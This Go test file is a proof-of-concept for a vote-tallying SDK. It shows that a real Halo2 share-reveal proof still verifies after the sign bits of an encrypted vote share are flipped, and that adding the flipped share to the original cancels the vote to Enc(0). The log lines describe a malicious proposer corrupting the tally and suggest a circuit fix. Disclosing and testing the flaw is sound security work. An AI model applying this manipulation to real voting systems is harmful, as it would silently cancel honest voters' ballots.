//go:build halo2

package halo2

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"os"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/valargroup/vote-sdk/crypto/elgamal"
	"github.com/valargroup/vote-sdk/ffi/zkp"
)

// TestSignBitFlip_RealProofVerifiesBothEncodings is the definitive proof of the
// sign-bit-flip vulnerability. It generates a real Halo2 proof via the Rust FFI,
// verifies it passes for the original EncShare, flips the sign bits, and
// demonstrates the SAME proof also passes for the flipped EncShare.
//
// No mock verifiers. No dummy proofs. Real circuit. Real Rust prover+verifier.
//
// Run with:
//
//	go test -tags halo2 -v -run TestSignBitFlip_RealProof ./ffi/zkp/halo2/ -timeout 120s
//
// Breakpoints:
//
//	ffi/zkp/halo2/verify.go:399  UnmarshalCiphertext — passes for both
//	ffi/zkp/halo2/verify.go:403  buf[63] &= 0x7F — C1 sign stripped
//	ffi/zkp/halo2/verify.go:405  buf[95] &= 0x7F — C2 sign stripped
//	ffi/zkp/halo2/verify.go:439  sv_verify_share_reveal_proof — rc=0 for both
func TestSignBitFlip_RealProofVerifiesBothEncodings(t *testing.T) {
	require.False(t, IsMock, "this test requires the real Halo2 verifier (build with -tags halo2)")

	// ── Step 1: Parse the fixture (same layout as prove_test.go). ──
	fixture, err := os.ReadFile("../testdata/share_reveal_inputs.bin")
	require.NoError(t, err, "fixture file missing — run: make fixtures")
	require.Len(t, fixture, 1488, "unexpected fixture size — run: make fixtures")

	merklePath := fixture[0:772]

	var shareComms [16][32]byte
	for i := 0; i < 16; i++ {
		copy(shareComms[i][:], fixture[772+i*32:772+(i+1)*32])
	}

	var primaryBlind [32]byte
	copy(primaryBlind[:], fixture[1284:1316])

	var encC1X [32]byte
	copy(encC1X[:], fixture[1316:1348])

	var encC2X [32]byte
	copy(encC2X[:], fixture[1348:1380])

	shareIndex := binary.LittleEndian.Uint32(fixture[1380:1384])
	proposalID := binary.LittleEndian.Uint32(fixture[1384:1388])
	voteDecision := binary.LittleEndian.Uint32(fixture[1388:1392])

	var roundID [32]byte
	copy(roundID[:], fixture[1392:1424])

	encShare := make([]byte, 64)
	copy(encShare, fixture[1424:1488])

	t.Logf("Original EncShare: %s", hex.EncodeToString(encShare))

	// ── Step 2: Generate a real Halo2 proof via Rust FFI. ──
	t.Log("Generating real share reveal proof via Rust FFI (~2s)...")
	proof, nullifier, treeRoot, err := GenerateShareRevealProof(
		merklePath, shareComms, primaryBlind,
		encC1X, encC2X,
		shareIndex, proposalID, voteDecision, roundID,
	)
	require.NoError(t, err)
	require.NotEmpty(t, proof)
	t.Logf("Proof: %d bytes, nullifier: %s, treeRoot: %s",
		len(proof), hex.EncodeToString(nullifier[:8]), hex.EncodeToString(treeRoot[:8]))

	// ── Step 3: Verify with original EncShare — must PASS. ──
	originalInputs := zkp.VoteShareInputs{
		ShareNullifier:   nullifier[:],
		EncShare:         encShare,
		ProposalId:       proposalID,
		VoteDecision:     voteDecision,
		VoteRoundId:      roundID[:],
		VoteCommTreeRoot: treeRoot[:],
	}

	err = VerifyShareRevealProof(proof, originalInputs)
	require.NoError(t, err, "real proof must verify against original EncShare")
	t.Log("[+] Step 3: Real Halo2 proof VERIFIED against original EncShare")

	// ── Step 4: Flip sign bits on EncShare. ──
	encFlipped := make([]byte, 64)
	copy(encFlipped, encShare)
	encFlipped[31] ^= 0x80
	encFlipped[63] ^= 0x80

	require.False(t, bytes.Equal(encShare, encFlipped),
		"flipped encoding must differ from original")
	t.Logf("Flipped  EncShare: %s", hex.EncodeToString(encFlipped))

	_, err = elgamal.UnmarshalCiphertext(encFlipped)
	require.NoError(t, err, "flipped EncShare must be valid Pallas points")
	t.Log("[+] Step 4: Flipped EncShare is valid (both points on Pallas curve)")

	// ── Step 5: Verify SAME proof with flipped EncShare — must ALSO PASS. ──
	flippedInputs := zkp.VoteShareInputs{
		ShareNullifier:   nullifier[:],
		EncShare:         encFlipped,
		ProposalId:       proposalID,
		VoteDecision:     voteDecision,
		VoteRoundId:      roundID[:],
		VoteCommTreeRoot: treeRoot[:],
	}

	err = VerifyShareRevealProof(proof, flippedInputs)
	require.NoError(t, err,
		"EXPLOIT: the same real Halo2 proof must ALSO verify against sign-bit-flipped EncShare")
	t.Log("[+] Step 5: SAME real Halo2 proof VERIFIED against FLIPPED EncShare")

	// ── Step 6: Demonstrate tally corruption via HomomorphicAdd. ──
	ctOriginal, err := elgamal.UnmarshalCiphertext(encShare)
	require.NoError(t, err)
	ctFlipped, err := elgamal.UnmarshalCiphertext(encFlipped)
	require.NoError(t, err)

	// C1 and C2 are negated: ctFlipped.C1 + ctOriginal.C1 should be identity.
	c1Sum := ctOriginal.C1.Add(ctFlipped.C1)
	require.True(t, c1Sum.IsIdentity(),
		"original.C1 + flipped.C1 must be identity (proving negation)")
	c2Sum := ctOriginal.C2.Add(ctFlipped.C2)
	require.True(t, c2Sum.IsIdentity(),
		"original.C2 + flipped.C2 must be identity (proving negation)")

	// HomomorphicAdd of original + flipped cancels out to Enc(0).
	acc := elgamal.HomomorphicAdd(ctOriginal, ctFlipped)
	require.True(t, acc.C1.IsIdentity(), "accumulated C1 is identity (zero)")
	require.True(t, acc.C2.IsIdentity(), "accumulated C2 is identity (zero)")
	t.Log("[+] Step 6: HomomorphicAdd(original, flipped) = Enc(0) — votes cancel out")

	t.Log("")
	t.Log("=================================================================")
	t.Log("  EXPLOIT CONFIRMED: Real Halo2 Proof Verifies Both Encodings")
	t.Log("=================================================================")
	t.Log("")
	t.Log("  A single proof generated by the real Rust Halo2 prover passes")
	t.Log("  sv_verify_share_reveal_proof for BOTH the original and the")
	t.Log("  sign-bit-flipped EncShare. Zero mock components involved.")
	t.Log("")
	t.Log("  Impact: a malicious proposer flips 2 bits in a mempool tx,")
	t.Log("  the honest voter's share is negated, and the tally is corrupted.")
	t.Log("")
	t.Log("  Root cause: ZKP #3 circuit constrains only x-coordinates.")
	t.Log("  Fix: add C1_sign and C2_sign as public inputs to the circuit.")
}
